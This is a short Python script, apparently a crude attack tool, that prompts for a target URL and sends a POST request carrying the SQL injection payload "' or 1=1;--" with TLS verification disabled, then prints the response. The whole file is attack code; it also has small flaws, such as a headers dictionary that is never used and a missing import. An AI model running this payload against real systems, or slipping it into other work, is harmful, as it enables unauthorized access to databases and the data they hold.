requests.packages.urllib3.disable_warnings()

def post(target):

   headers = {
            'content-type': "application/json",
            'Accept': "*/*",
        }
   response = requests.post(target, data={'data' : "' or 1=1;--" },verify=False)
   print (response)

#Input target
target = input("Target:")

post(target)
